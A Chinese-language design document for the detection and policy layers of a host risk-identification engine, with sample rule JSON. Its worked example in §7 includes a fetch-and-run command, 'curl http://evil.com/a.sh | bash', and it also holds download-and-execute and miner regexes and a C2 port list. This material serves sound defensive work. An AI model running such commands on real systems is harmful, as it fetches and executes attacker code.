# risk-identification 引擎与规则/策略配合设计

**语言：** [English](18-risk-identification-engine-design.md) | 简体中文（本文）

> 文档版本 v1.2 | 按当前代码核对：2026-09-21
> 读者：安全运营、检测工程、Skill 维护者  
> 相关：[DESIGN.zh-CN.md](../src/skills/risk-identification/DESIGN.zh-CN.md) · [behavior-policy-engine-design.zh-CN.md](19-behavior-policy-engine-design.zh-CN.md) · [rules/README.zh-CN.md](../src/skills/risk-identification/rules/README.zh-CN.md)

**文档结构：** §1–7 架构与数据流 · **§8–10 如何写检测/策略规则（含示例）** · §11+ 目录索引与验证

---

**按任务阅读：** 可直接跳到需要的章节，不必从头通读。

- [4. 检测引擎架构](#4-检测引擎架构)
- [8. 实操：如何写检测规则](#8-实操如何写检测规则)
- [9. 策略规则维护入口](#9-策略规则维护入口)
- [15. 验证](#15-验证)

## 1. 设计目标

risk-identification 回答两个问题：

1. **这条日志/这个事件像什么攻击？**（检测层）
2. **要不要推送告警、最终严重度是多少？**（策略层）

刻意 **不做** 跨主机攻击链还原（→ `traceability-analysis`）、WAF 误报二审（→ `alert-confirmation`）。

核心原则：

| 原则 | 含义 |
|------|------|
| **检测 vs 策略分离** | `matched_rules[]` 由 JSON 规则产生；`alert_required` 由策略裁决 |
| **运营可配置** | 检测改 `rules/*.json`；策略改 `behavior-policy.md` + `behavior-policy.rules.json` |
| **单事件优先** | 每条 `risk_item` 可追溯到具体 evidence |
| **引擎薄、规则厚** | Python 只做加载、求值、编排；业务语义在 JSON/MD |

---

## 2. 端到端数据流

```text
dataasset 取数（evidence-fetch / assess --fetch）
        │
        ▼
evidence_bundles（已归一化 JSON）
  host_exec · host_connect · dns_log · host_persistence · ssh_auth · syslog_risk_alert
        │
        ▼
assess.py（编排）
  Step 0  completeness → confidence 上限
  Step 1  过滤 hosts / 时间窗
  Step 2  【检测层】六模块引擎 → risk_items[]（初判 severity + matched_rules）
  Step 3  去重
  Step 4  【策略层】policy_engine → alert_required / policy_rule_id
  Step 5  环境白名单（默认开启）· attck-map 富化 · top_incidents 聚合
  Step 6  JSON / markdown 输出
        │
        ▼
risk_items[] / top_incidents[] / policy_hits[]
        │
        └──▶ traceability-analysis（消费 matched_rules + chain-patterns）
```

**输入不是原始 syslog 行**，而是 dataasset + `trace_profile` 归一化后的结构化事件（如 `listener_port`、`command`、`event_type`）。

---

## 3. 两层模型：检测 vs 策略

```text
┌──────────────────────────────────────────────────────────────┐
│ 检测层  rules/*-rules.json                                    │
│   问题：「像不像 download_and_execute / ssh_bruteforce？」     │
│   输出：matched_rules[]、初判 severity、risk_tags、verdict*   │
│   *verdict 仅为检测层建议，可被策略覆盖                        │
└────────────────────────────┬─────────────────────────────────┘
                             │ risk_item
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ 策略层  behavior-policy.md + behavior-policy.rules.json       │
│   问题：「运维噪声要不要告警？WebShell 是否必须 P0？」          │
│   优先级：硬护栏 → 必须告警 → 降噪 → 默认                      │
│   输出：policy_rule_id、alert_required、最终 severity           │
└──────────────────────────────────────────────────────────────┘
```

### 3.1 为什么分两层？

| 场景 | 只改检测层 | 只改策略层 |
|------|-----------|-----------|
| 新增 curl\|bash 模式 | ✅ exec-rules.json | — |
| portal 部署 agent 不告警 | — | ✅ OPS-DEPLOY-001 |
| nginx 下 sh -c id 必须告警 | 检测已有 shell 标签 | ✅ WEB-SHELL-001 强制告警 |
| 演练 useradd devops 降噪 | 检测仍会命中 account | ✅ OPS-LAB-SETUP-001 |

同一 `matched_rule` 可在策略层被 **强制告警**、**降噪** 或 **硬护栏禁止降级**。

### 3.2 第三层：环境白名单（whitelist.json）

```text
检测 → behavior-policy → whitelist.json（默认开启）→ 输出
```

| 层 | 文件 | 职责 |
|----|------|------|
| 策略 | behavior-policy | 全平台硬护栏 / 必须告警 / OPS 降噪 |
| 白名单 | whitelist.json | 环境 scope 例外（`exe_prefixes`、`dst_cidrs` 等） |

CLI 默认读取 `whitelist.json`；禁用：`--no-whitelist` 或 `"whitelist": {"enabled": false}`。详见 [whitelist.zh-CN.md](../src/skills/risk-identification/whitelist.zh-CN.md)。

---

## 4. 检测引擎架构

检测层由 **3 种 engine profile** + **2 个公共模块** 组成：

```text
                    rule_loader.py
                    （加载 + engine 字段校验）
                           │
     ┌─────────────────────┼─────────────────────┐
     ▼                     ▼                     ▼
 pipeline              chain               aggregate
 exec_rules.py    connect / syslog        ssh / dns
     │              persistence                │
     │                     │                     │
     └────────── detection_output.py ───────────┘
                           │
              detection_rule_chain.py（chain 专用）
                           │
              shared_conditions.py（条件 DSL，策略层复用）
```

### 4.1 三种 profile

| `engine` | 规则包 | 运行时类 | 匹配模型 |
|----------|--------|----------|----------|
| **`pipeline`** | `exec-rules.json` | `ExecRulesEngine` | 多阶段扫描：structural → P0 regex → P1 keyword → fallback → `context_boost` |
| **`chain`** | `connect-rules.json`、`syslog-rules.json`、`persistence-rules.json` | `RuleChainEngine` | 有序 `rules[]`，每条含 `when` + `severity` |
| **`aggregate`** | `ssh-rules.json`、`dns-rules.json` | `SshRulesEngine`、`DnsRulesEngine` | SSH 失败波次、DNS 查询画像及 DoH/DoT 外连检查 |

JSON 顶层 **`engine`** 必填；`rule_loader` 校验 **文件名 ↔ engine** 一致，防止误配。

### 4.2 公共模块

#### `detection_output.py`

统一处理规则包中的：

- `risk_tags` → `risk_tags[]`
- `verdicts` / `actions` / `confidence_base` → 检测层输出字段

exec / connect / syslog / ssh / dns / persistence 均已接入；模块特有逻辑（如 exec 的 `noise_command`、connect 的 `business_whitelist_connect`）通过 **薄 wrapper** 或 `adjust` hook 扩展。

#### `detection_rule_chain.py`

服务于 **`chain`** profile：

1. 按顺序遍历 `rules[]`
2. 求值 `when`（命中则 `apply_rule` 更新 `matched[]` 与 `best severity`）
3. 收集 tags

**connect** 使用 `when_mode=flat_handlers`（`web_context`、`dst_private` 等计算字段）。  
**persistence** 使用 `when_mode=flat_clauses` 对持久化事件匹配。

**syslog** 使用 `when_mode=flat_clauses`（`event_type`、`risk_level_in` 等），并额外跑 `message_rules[]` 正则 pass。

#### `shared_conditions.py`

声明式条件求值（`all/any/not`、`command_regex`、`predicate`、`field_equals`…）。  
**检测层** connect/syslog 的 `when_extensions` 与 **策略层** `behavior-policy.rules.json` 的 `predicates` **共用同一套 DSL**。

---

## 5. 各模块检测引擎说明

### 5.1 exec（`engine: pipeline`）

**配置：** `rules/exec-rules.json`（v1.2+ 每条 pattern/keyword **必填 `field`**）

**显式字段匹配：** `p0_regex` / `p1_regex` / `p1_keywords` 等对 `match_fields` 中声明的字段求值，例如：

```json
{
  "id": "download_and_execute",
  "field": "command",
  "pattern": "(curl|wget).*(\\||;|&&).*\\b(sh|bash)\\b",
  "flags": "i"
}
```

| field | 来源 |
|-------|------|
| `command` | argv 拼接；空则回退 `comm` |
| `exe` / `comm` / `cwd` / `listener_process` | 同名字段 |
| `command_line` | 原始一行 command_line |

**structural_rules** 仍用结构化条件（`listener_process` + `exe`/`comm`），见 JSON 内 `fields` 说明。

```text
external_listener_shell_exec（structural）
    → p0_regex（如 download_and_execute、reverse_shell）
    → p1_regex / p1_keywords
    → fallback_plain + elevations
    → p3_keywords（噪声）
    → context_boost（Web 端口 / cwd / 有 connect 或 file_op 加权）
```

**输出示例：**

```json
{
  "severity": "P0",
  "matched_rules": ["external_listener_shell_exec", "download_and_execute"],
  "risk_tags": ["shell_execution", "remote_download"]
}
```

**运营改法：** 增删 `p0_regex` / `p1_keywords`；不改 Python。

---

### 5.2 connect（`engine: chain`）

**配置：** `rules/connect-rules.json`

**特点：**

- 单条 `host_connect` 事件 + 可选 **同窗 exec 文本**（`exec_download_nearby`）
- `when` 依赖 **引擎注入 ctx**：`web_context`、`dst_private`、`port`、`exec_download_nearby`
- 支持 `when_extensions` 插件扩展

**规则顺序示例：**

1. `external_c2_connect`（Web 上下文 + 公网）→ P0  
2. `suspicious_port_connect` → P0/P1  
3. `exec_correlated_egress` → P1  
4. `business_whitelist_connect` → P3（兜底）

---

### 5.3 syslog（`engine: chain`）

**配置：** `rules/syslog-rules.json`

**两路匹配：**

1. `rules[]` — 按 `event_type` / `risk_level_in` 等结构化字段  
2. `message_rules[]` — 对 command/message 做 regex（如 `sudo useradd`）

**排除：** SSH 暴破 raw 事件在 `exclude_event_types`，由 **ssh 模块** 聚合，避免重复告警。

---

### 5.4 ssh（`engine: aggregate`）

**配置：** `rules/ssh-rules.json`

**不是单事件 rule chain**，而是：

```text
ssh_auth 失败事件流
    → 按 (victim_host, src_ip) 分组
    → 滑动时间窗（默认 300s）
    → 失败次数 ≥ threshold（默认 10）→ 形成一个 burst / wave
    → severity 由 thresholds[] 决定（10 次 P0、5 次 P2…）
    → 输出一条 risk_item（matched_rules: ssh_bruteforce）
```

`brute_force_rule.policy_rule_id` 须与策略层 **SSH-BRUTE-001** 对齐。

`assess.py` 当前通过 `params.ssh_brute_window_sec`（默认 300）和 `params.ssh_brute_threshold`（默认 10）显式传入聚合窗口与成波阈值，因此从该入口调参应设置这两个参数。直接调用 SSH 引擎且不传覆盖值时才使用规则包中的 `brute_force.window_sec` / `threshold`。`thresholds[]` 决定检测层等级；只有达到成波阈值才会产生风险项，随后 `SSH-BRUTE-001` 策略还可能把等级调整为 P0。

---

### 5.5 dns（`engine: aggregate`）

配置为 `rules/dns-rules.json`，由 `DnsRulesEngine` 处理 `dns_log` 的 NXDOMAIN、疑似 DGA、非常见 TLD、疑似隧道画像，并利用 `host_connect` 检查 DoH/DoT。S8 默认启用；缺少 DNS 日志时只能做具备连接证据的外连检查。DNS 特征不能单独证明 C2 或外传体量。

### 5.6 persistence（`engine: chain`）

配置为 `rules/persistence-rules.json`，由 `PersistenceRulesEngine` 经 `RuleChainEngine` 匹配 `host_persistence`。覆盖 cron、systemd、SSH 公钥、profile、sudoers 等持久化位置变更。S5 系列按 `scenarios.json` 选择；`host_file_op` 仍是辅助证据，不等于独立文件检测模块。

## 6. 策略引擎架构

```text
behavior-policy.md              ← Agent 权威、审计、自然语言
behavior-policy.rules.json      ← CLI/CI 单一事实来源
        │
        ▼
policy_engine.py
        │  shared_conditions.eval_condition / eval_predicate
        ▼
behavior_policy.py              ← PolicyDecision、apply_behavior_policy 编排
```

### 6.1 策略规则结构

`behavior-policy.rules.json` 含：

| 块 | 作用 |
|----|------|
| `predicates` | 可复用复合条件（`is_web_entry`、`is_sshd_session`…） |
| `rules[]` | 带 `tier` 的显式策略（`hard_guardrail` / `force_alert` / `downgrade`） |
| `default_behavior.rules[]` | 无命中时的 P0/P1 告警、P2 观察、P3 留痕 |

### 6.2 裁决优先级

```text
hard_guardrail  →  禁止被任何降噪覆盖
force_alert     →  必须告警（优先于 downgrade）
downgrade       →  降噪 / suppress
default         →  按初判 severity 默认行为
```

同一 item 命中多条时：`pick_best_decision()` 取 **最严重且符合优先级** 的决策。

### 6.3 策略如何引用检测层

策略规则的 `when` 常用：

| 条件类型 | 示例 |
|----------|------|
| `matched_rules_any` | 检测命中 `download_and_execute` |
| `predicate` | `is_web_entry` + `is_shell_command` |
| `risk_module` | 按风险项的模块筛选：`exec` / `connect` / `dns` / `persistence` / `ssh` / `syslog` |
| `command_regex` | 策略层直接看 command 文本 |

**硬护栏示例：** 命中 `persistence_modify` 时一律 P0，除非 `unless` 命中 `is_lab_setup`。

---

## 7. 检测 + 策略配合：完整示例

**事件：** nginx:443 下子进程执行 `curl http://evil.com/a.sh | bash`

### Step A — 检测层（exec）

```json
{
  "risk_module": "exec",
  "severity": "P0",
  "matched_rules": ["external_listener_shell_exec", "download_and_execute"],
  "risk_tags": ["shell_execution", "remote_download"],
  "verdict": "confirmed_attack"
}
```

### Step B — 策略层

| 若场景 | 命中策略 | 结果 |
|--------|----------|------|
| 恶意下载 | `DOWNLOAD-MALICIOUS-001` | `alert_required=true` |
| 来自 portal 部署 | `OPS-DEPLOY-001`（unless `is_trusted_deploy`） | `alert_suppressed=true` |
| 无额外策略 | `DEFAULT-ALERT` | P0/P1 默认告警 |

**最终 risk_item 字段：**

```json
{
  "severity": "P0",
  "matched_rules": ["external_listener_shell_exec", "download_and_execute"],
  "policy_rule_id": "DOWNLOAD-MALICIOUS-001",
  "policy_tier": "force_alert",
  "alert_required": true,
  "alert_suppressed": false,
  "original_risk": { "severity": "P0", ... }
}
```

---

## 8. 实操：如何写检测规则

> 详细字段说明见 [rules/README.zh-CN.md](../src/skills/risk-identification/rules/README.zh-CN.md)；标签命名见 [detection-catalog.zh-CN.md](../src/skills/risk-identification/detection-catalog.zh-CN.md)。

### 8.1 写之前先分清「检测」与「策略」

| 你想做的事 | 改哪个文件 | 典型字段 |
|-----------|-----------|---------|
| 识别「这条命令像不像挖矿」 | `exec-rules.json` | `p0_regex` / `p1_regex` |
| 识别「Web 进程外连公网」 | `connect-rules.json` | `rules[].when` |
| 识别「sudo useradd」 | `syslog-rules.json` | `message_rules[]` |
| 调整 SSH 暴破阈值 | `ssh-rules.json` | `thresholds[]` |
| **这条命中了但要降噪** | `behavior-policy.rules.json` | `tier: downgrade` |
| **这条必须 P0 告警** | `behavior-policy.rules.json` | `tier: force_alert` |

**检测层只回答「像什么」**；`verdicts` / `actions` 是检测建议，**不决定**是否推送告警。

### 8.2 通用约定

1. **顶层 `engine` 勿改** — `exec`→`pipeline`，`connect`/`syslog`/`persistence`→`chain`，`ssh`/`dns`→`aggregate`
2. **`id` = `matched_rule` 标签** — 策略层用 `matched_rules_any` 引用同一字符串
3. **regex 反斜杠双写** — JSON 里 `\b` 写成 `\\b`，`.` 写成 `\\.`
4. **临时关闭** — `"enabled": false`，不要删条目
5. **改完验证** — `.venv/bin/python -m unittest discover -s src/skills/risk-identification/tests -p 'test_*.py'`

---

### 8.3 exec（`engine: pipeline`）— 新增攻击 pattern

**场景：** 运营发现主机上出现 `xmrig` 挖矿进程，希望在 exec 层打上标签 `crypto_miner`。

**Step 1** — 在 `exec-rules.json` 的 `p1_regex`（或 `p0_regex` 若需 P0）追加：

```json
{
  "id": "crypto_miner",
  "field": "command",
  "pattern": "\\bxmrig\\b|minerd|cpuminer|stratum\\+tcp",
  "flags": "i",
  "enabled": true,
  "note": "常见挖矿客户端或 stratum 协议"
}
```

**Step 2** — 在 `risk_tags` 块登记标签（供输出与 attck-map 引用）：

```json
"risk_tags": {
  "crypto_miner": ["impact", "resource_hijacking"]
}
```

**Step 3（可选）** — 若 Web 入口下挖矿应更高危，不必改 exec；交给策略层 `force_alert`（见策略引擎参考的条件示例）。

**已有 structural 规则示例**（一般不用改，理解即可）：

```json
"structural_rules": {
  "external_listener_shell_exec": {
    "enabled": true,
    "severity": "P0",
    "requires_web_listener": true,
    "requires_shell_exe": true
  }
}
```

含义：nginx 等 Web 监听进程的后代执行 `sh`/`bash`/`python` → 命中 `external_listener_shell_exec`（P0）。

**P0 下载执行 pattern 示例**（仓库已有，可照抄格式增删）：

```json
{
  "id": "download_and_execute",
  "field": "command",
  "pattern": "(curl|wget|fetch).*(\\||;|&&).*\\b(sh|bash|python|php|perl)\\b",
  "flags": "i",
  "enabled": true
}
```

**噪声命令** — 放进 `p3_keywords`，降低初判 severity：

```json
{ "id": "noise_command", "field": "command", "keyword": "hostname", "enabled": true }
```

---

### 8.4 connect（`engine: chain`）— 有序 rules + when

**场景：** Web 上下文内连内网 Redis（6379）目前只标 P3，希望单独标 P1。

**Step 1** — 确认 `common_service_ports` 已含 `6379`（已有则跳过）。

**Step 2** — 在 `rules[]` **靠前**插入（顺序很重要，先严后宽）：

```json
{
  "id": "redis_lateral_from_web",
  "severity": "P1",
  "enabled": true,
  "note": "Web 进程连内网 Redis，疑似横向探测",
  "when": {
    "web_context": true,
    "dst_private": true,
    "dst_port_in": [6379]
  }
}
```

**内置 when 键速查：**

| when 键 | 含义 |
|---------|------|
| `web_context` | 监听进程/端口属于 Web 上下文 |
| `dst_private` | 目标 IP 在内网 CIDR |
| `dst_port_in` | 端口在列表或 `"suspicious_ports"` 等命名列表 |
| `exec_download_nearby` | 同窗 host_exec 含 curl/wget |
| `no_matched_rules` | 前面规则均未命中 |
| `severity_worse_than` | 当前 best severity 低于指定级别 |

**自定义 when（免改 Python）** — 用 `when_extensions`：

```json
"when_extensions": {
  "high_risk_egress": {
    "all": [
      { "field_equals": { "field": "web_context", "value": true } },
      { "field_equals": { "field": "dst_private", "value": false } }
    ]
  }
},
"rules": [
  {
    "id": "external_c2_connect",
    "severity": "P0",
    "when": { "high_risk_egress": true }
  }
]
```

**完整 connect 规则片段**（仓库真实结构）：

```json
{
  "id": "exec_correlated_egress",
  "severity": "P1",
  "enabled": true,
  "when": {
    "exec_download_nearby": true,
    "severity_worse_than": "P0"
  },
  "keep_severity_if": "P0"
}
```

---

### 8.5 syslog（`engine: chain`）— 结构化 + 正则两路

**场景 A — 按 event_type：** 新增 `docker_exec` 事件标 P1

```json
{
  "id": "docker_exec",
  "severity": "P1",
  "enabled": true,
  "when": { "event_type": "docker_exec" }
}
```

**场景 B — 按 command 正则：** sudo 下执行 `useradd`

```json
{
  "id": "sudo_useradd",
  "pattern": "useradd|adduser",
  "flags": "i",
  "severity": "P0",
  "enabled": true,
  "event_types": ["sudo_command", "account_created"]
}
```

追加到 `message_rules[]`（不是 `rules[]`）。

**多条件 when 示例**（仓库已有）：

```json
{
  "id": "sudo_high_risk",
  "severity": "P1",
  "when": {
    "event_type": "sudo_command",
    "risk_level_in": ["high", "critical"]
  }
}
```

> SSH 暴破 raw 事件在 `exclude_event_types` 中排除，由 **ssh 聚合模块**处理，勿在 syslog 重复告警。

---

### 8.6 ssh（`engine: aggregate`）— 阈值与输出语义

**场景：** 5 分钟内至少 5 次失败才形成波次；检测层 15 次为 P0、5 次为 P2。最终等级仍受告警策略影响。先在输入的 `params` 中设置 `"ssh_brute_window_sec": 300` 和 `"ssh_brute_threshold": 5`。

```json
"thresholds": [
  { "min_count": 15, "severity": "P0", "enabled": true },
  { "min_count": 5,  "severity": "P2", "enabled": true }
],
"brute_force": { "window_sec": 300, "threshold": 5, "suppress_self_loop": true },
"brute_force_rule": {
  "matched_rule": "ssh_bruteforce",
  "policy_rule_id": "SSH-BRUTE-001",
  "risk_tags": ["credential_access", "brute_force"]
}
```

`brute_force_rule.policy_rule_id` **必须与策略层 SSH-BRUTE-001 一致**，否则 attck-map 与溯源会对不上。

---

## 9. 策略规则维护入口

策略结构、谓词、tier 和条件示例统一维护在 [策略引擎参考](19-behavior-policy-engine-design.zh-CN.md)。检测规则只负责标签与初判；要调整最终告警，须同步策略 MD 与 JSON，并用正/负例验证。

## 10. 端到端示例：从需求到配置

### 10.1 需求：Jenkins 在 Web 容器里跑 `curl | bash` 安装插件要降噪

**分析：**

- **检测层**仍应识别 `download_and_execute`（安全审计需要 matched_rules）
- **策略层**对 Jenkins 特征 command 做 downgrade

**Step 1 — 检测（通常已有，无需改）**  
`exec-rules.json` 的 `download_and_execute` pattern 已覆盖。

**Step 2 — 新增 predicate**

```json
"is_jenkins_plugin_install": {
  "command_regex": "jenkins\\.example\\.com.*plugin|/var/jenkins_home.*curl.*\\|.*sh",
  "flags": "i"
}
```

**Step 3 — 新增 downgrade 规则**

```json
{
  "id": "OPS-JENKINS-001",
  "tier": "downgrade",
  "modules": ["exec"],
  "when": { "predicate": "is_jenkins_plugin_install" },
  "decision": {
    "severity": "P3",
    "alert_required": false,
    "alert_suppressed": true,
    "verdict": "benign",
    "recommended_action": "log_only",
    "reason": "Jenkins 官方插件安装脚本"
  }
}
```

**Step 4 — behavior-policy.md** 增加 `OPS-JENKINS-001` 自然语言条目。

**Step 5 —** `make validate-policy` + 演练环境回放一条合成 Jenkins command，核对检测仍保留、命中策略以及最终 severity/抑制字段。示例 predicate 应收紧到获批准的环境；匹配该示例本身不证明任意命令安全。

**裁决顺序说明：** 若同时命中 `DOWNLOAD-MALICIOUS-001`（force_alert）与 `OPS-JENKINS-001`（downgrade），引擎按 tier 优先级取 **force_alert / hard_guardrail 优先**；因此 Jenkins 规则应确保 `unless` 或 predicate 足够精确，或把 Jenkins 路径放进 `DOWNLOAD-MALICIOUS-001` 的 `unless` 里。

---

### 10.2 需求：Web 进程外连 C2 端口必须 P0 告警

**检测层** — `connect-rules.json` 已有 `external_c2_connect`、`suspicious_port_connect`。

**策略层** — 对特定端口强制告警（仓库 `CONNECT-C2-001`）：

```json
{
  "id": "CONNECT-C2-001",
  "tier": "force_alert",
  "modules": [
    "connect"
  ],
  "when": {
    "dst_port_in": [
      4444,
      1337,
      31337,
      5555,
      9001
    ]
  },
  "decision": {
    "severity": "P0",
    "alert_required": true,
    "alert_suppressed": false,
    "verdict": "confirmed_attack",
    "recommended_action": "investigate_and_contain",
    "reason": "外连可疑 C2 高危端口"
  }
}
```

用合成连接事件回放后，检查检测、`policy_rule_id=CONNECT-C2-001` 及白名单处理后的最终字段。推荐动作不等于执行主机隔离。

**数据流：**

```text
host_connect 事件
  → connect 检测: matched_rules=[suspicious_port_connect], severity=P0
  → 策略: policy_rule_id=CONNECT-C2-001, alert_required=true
  → attck-map: 富化 MITRE
```

---

### 10.3 需求：新增 matched_rule 并在溯源剧本中引用

1. **exec-rules.json** — 新增 `id: webshell_write` pattern  
2. **risk_tags** + **attck-map.json** — 登记 MITRE T1505.003  
3. **behavior-policy.rules.json** — 可选 `force_alert`  
4. **chain-patterns.json** — 在 `stage_rules.initial_access` 加入 `"webshell_write"`

检测层与策略层改完即可在 risk-identification 生效；chain-patterns 供 **traceability-analysis** 凑链，不影响单事件 assess。

---

## 11. 规则包全景（`rules/` 目录）

| 文件 | 层级 | engine | 作用 |
|------|------|--------|------|
| `exec-rules.json` | 检测 | pipeline | host_exec 攻击 pattern |
| `connect-rules.json` | 检测 | chain | host_connect 外连判定 |
| `syslog-rules.json` | 检测 | chain | syslog 结构化风险 |
| `ssh-rules.json` | 检测 | aggregate | SSH 暴力破解 |
| `dns-rules.json` | 检测 | aggregate | DNS 查询画像与 DoH/DoT 特征 |
| `persistence-rules.json` | 检测 | chain | 持久化变更 |
| `behavior-policy.rules.json` | **策略** | — | CLI 告警/降噪 |
| `attck-map.json` | 富化 | — | matched_rule / policy_rule_id → MITRE |
| `chain-patterns.json` | **叙事** | — | 跨阶段剧本（溯源复用，非单事件检测） |

### 11.1 chain-patterns 与检测/策略的关系

- **检测层** 产出 `matched_rules[]` 与 `policy_rule_id`
- **chain-patterns.json** 定义多阶段剧本（如 `web_shell_to_ssh_lateral`），每阶段引用检测标签或策略 ID
- **消费者：** `traceability-analysis`（不在 risk-identification 内做链还原）

risk-identification 只保证 **单点标签正确**；链是否凑齐由溯源 Skill 判定。

---

## 12. Agent 路径 vs CLI 路径

| 路径 | 检测 | 策略 |
|------|------|------|
| **assess.py CLI** | `rules/*.json` | `behavior-policy.rules.json` → `policy_engine` |
| **智能体按 Skill 调用 assess.py** | `rules/*.json` | 与 CLI 相同的 JSON 策略引擎；MD 提供解释 |

运营维护约定：

1. 改 `behavior-policy.md`（审计 / Agent）
2. 同步 `behavior-policy.rules.json`（智能体/CLI 共用执行）
3. `make validate-policy` 校验 ID 一致，并回放应命中与不应命中的样例

---

## 13. 扩展点（运营 vs 工程）

| 需求 | 改什么 | 是否改 Python |
|------|--------|---------------|
| 新 regex / 端口列表 | `*-rules.json` | 否 |
| 新降噪/必须告警规则 | MD + `behavior-policy.rules.json` | 否 |
| 新复合谓词 | `predicates` 块 | 否 |
| connect/syslog 新 when 键（声明式） | `when_extensions` | 否 |
| connect 新 **计算 ctx**（如全新互证字段） | — | 是（handler） |
| 新 condition **类型** | — | 是（`shared_conditions`） |
| 新 risk module（如 EDR） | 新 engine profile + JSON | 是 |

---

## 14. 代码模块索引

| 模块 | 职责 |
|------|------|
| `assess.py` | 全流程编排 |
| `rule_loader.py` | JSON 加载、`engine` 校验 |
| `exec_rules.py` | pipeline 检测 |
| `connect_rules.py` | connect 领域 + RuleChainEngine |
| `syslog_rules.py` | syslog 领域 + RuleChainEngine |
| `ssh_rules.py` | SSH aggregate 检测 |
| `dns_rules.py` | DNS aggregate 检测 |
| `persistence_rules.py` | 持久化 chain 检测 |
| `detection_rule_chain.py` | chain 通用匹配 |
| `detection_output.py` | 检测层统一输出 |
| `shared_conditions.py` | 条件 DSL |
| `policy_engine.py` | 策略 JSON 解释 |
| `behavior_policy.py` | 策略编排入口 |
| `attck_map.py` | MITRE 富化 |
| `incident_aggregator.py` | top_incidents |
| `source_risk_map.py` | 数据源缺口提醒 |

---

## 15. 验证

```bash
.venv/bin/python -m unittest discover -s src/skills/risk-identification/tests -p 'test_*.py'
make validate-policy
```

报告元数据中的策略、白名单和检测规则路径对仓库内文件使用仓库相对路径；仓库外的用户自定义路径仍保持显式。公开 fixtures 不得包含开发者主目录。`make ci` 和归档校验会在 demo 报告重新生成后再次执行发布扫描。

---

## 16. 相关文档

- 运营手册：[OPS-HANDBOOK.zh-CN.md](../src/skills/risk-identification/OPS-HANDBOOK.zh-CN.md)
- 检测标签：[detection-catalog.zh-CN.md](../src/skills/risk-identification/detection-catalog.zh-CN.md)
- 策略运营：[behavior-policy.zh-CN.md](../src/skills/risk-identification/behavior-policy.zh-CN.md)
- 规则编辑：[rules/README.zh-CN.md](../src/skills/risk-identification/rules/README.zh-CN.md)
- 策略引擎：[behavior-policy-engine-design.zh-CN.md](19-behavior-policy-engine-design.zh-CN.md)
